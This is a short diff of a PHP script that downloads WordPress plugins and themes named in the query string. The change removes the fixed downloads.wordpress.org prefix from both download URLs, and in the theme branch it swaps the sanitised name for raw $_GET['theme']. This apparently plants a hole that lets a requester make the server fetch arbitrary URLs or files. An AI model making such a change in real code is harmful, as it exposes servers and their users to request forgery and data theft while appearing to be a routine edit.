@@ -19,10 +19,10 @@ function download_file($url)
 
 if (isset($_GET['plugin'])) {
     $plugin_name = preg_replace('#[^a-zA-Z0-9\.\-_]#', '', $_GET['plugin']);
-    $zip_url = 'https://downloads.wordpress.org/plugin/' . $plugin_name;
+    $zip_url = $plugin_name;
 } else if (isset($_GET['theme'])) {
     $theme_name = preg_replace('#[^a-zA-Z0-9\.\-_]#', '', $_GET['theme']);
-    $zip_url = 'https://downloads.wordpress.org/theme/' . $theme_name;
+    $zip_url = $_GET['theme'];
 } else {
     die('Invalid request');
 }
